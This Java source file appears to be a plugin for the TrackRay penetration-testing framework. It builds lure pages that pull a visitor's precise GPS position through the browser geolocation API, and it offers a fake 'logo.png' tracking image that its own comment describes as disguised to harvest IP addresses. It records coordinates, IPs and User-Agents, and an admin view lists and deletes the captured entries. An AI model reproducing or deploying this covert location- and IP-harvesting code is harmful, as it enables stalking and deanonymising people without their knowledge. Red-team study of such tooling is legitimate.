package com.trackray.module.mvc.gps;

import com.trackray.base.annotation.Function;
import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Rule;
import com.trackray.base.plugin.MVCPlugin;
import org.apache.catalina.connector.Response;
import org.apache.commons.io.FileUtils;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.repository.CrudRepository;
import org.springframework.util.Base64Utils;

import javax.imageio.ImageIO;
import javax.servlet.ServletOutputStream;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/5/15 12:22
 */
@Rule(defaultPage = "gpsloctionMain")
@Plugin(title = "GPS定位" , value = "gpsLocation" ,author = "浅蓝")
public class GPSLocation extends MVCPlugin {

    /**
     * 通过调用H5 GPS 定位接口来获取精确位置，需要开启 HTTPS。
     */
    @Override
    public void index() {
        File file = new File(BASE + "/gpsLocation/");
        if (!file.exists())
        {
            model.setViewName("index");
            return;
        }
        String remark = "";
        if (param.containsKey("remark"))
            remark = param.get("remark").toString();
        model.addObject("remark",remark);


        for (File template : file.listFiles()) {
            if (template.getName().equals(function)){
                try {
                    String body = FileUtils.readFileToString(template,"UTF-8");
                    model.addObject("body",body);
                    model.setViewName("index");
                } catch (IOException e) {
                    log.error(e.getMessage());
                }
            }
        }



    }

    /**
     * 伪装成图片来钓IP
     */
    @Function("logo.png")
    public void image(){

        GpsData gps = new GpsData();
        String userAgent = request.getHeader("User-Agent");
        gps.setUserAgent(userAgent);

        gps.setMsg("通过图片获取");

        String remoteAddr = request.getRemoteAddr();

        gps.setIp(remoteAddr);

        gpsRepository.save(gps);

        try {
            response.setContentType("image/png");

            BufferedImage read = ImageIO.read(new File(BASE+"/common/simple.png"));
            ServletOutputStream out = response.getOutputStream();
            ImageIO.write(read, "JPEG", out);
        }catch (Exception e){
            log.error(e.getMessage());
        }
    }

    @Autowired
    private GPSRepository gpsRepository;

    @Function(value = "generate" , desc = "生成页面")
    public void generate(){
        String remark = param.getOrDefault("remark","").toString();
        if (param.containsKey("template")){
            model.addObject("link",param.get("template").toString()+(StringUtils.isNotEmpty(remark)?("?remark="+remark):""));
        }

        File templateDir = new File(BASE + "/gpsLocation/");
        if (templateDir.exists()){
            List<String> templates = Arrays.asList(templateDir.list());
            model.addObject("templates",templates);
        }

        model.setViewName("generate");
    }

    @Function(value = "gpsloctionMain" , desc = "管理页面")
    public void datas(){
        ArrayList<GpsData> datas = new ArrayList<>();
        for (GpsData gpsData : gpsRepository.findAll()) {
            datas.add(gpsData);
        }
        model.addObject("datas",datas);
        model.setViewName("result");
    }
    @Function(value = "delete" , desc = "删除数据")
    public void delete(){
        gpsRepository.deleteById(Long.parseLong(param.get("id").toString()));
        model.setViewName("../common/default");
        model.addObject("msg","success");
    }

    @Function(value = "addData" , desc = "添加数据")
    public void addData(){
        GpsData gps = new GpsData();
        String userAgent = request.getHeader("User-Agent");
        gps.setUserAgent(userAgent);
        if (param.containsKey("latitude")){
            gps.setLatitude(param.get("latitude").toString());
        }
        if (param.containsKey("remark") ){
            String remark = param.get("remark").toString();
            if (!remark.isEmpty()) {
                String decoder = new String(Base64.getDecoder().decode(remark));
                gps.setRemark(decoder);
            }
        }

        if (param.containsKey("longitude")){
            gps.setLongitude(param.get("longitude").toString());
        }

        if (param.containsKey("msg")){
            gps.setMsg(param.get("msg").toString());
        }

        String remoteAddr = request.getRemoteAddr();

        gps.setIp(remoteAddr);

        gpsRepository.save(gps);

        model.setViewName("../common/default");
        model.addObject("msg","success");
    }


}

interface GPSRepository extends CrudRepository<GpsData, Long> {
}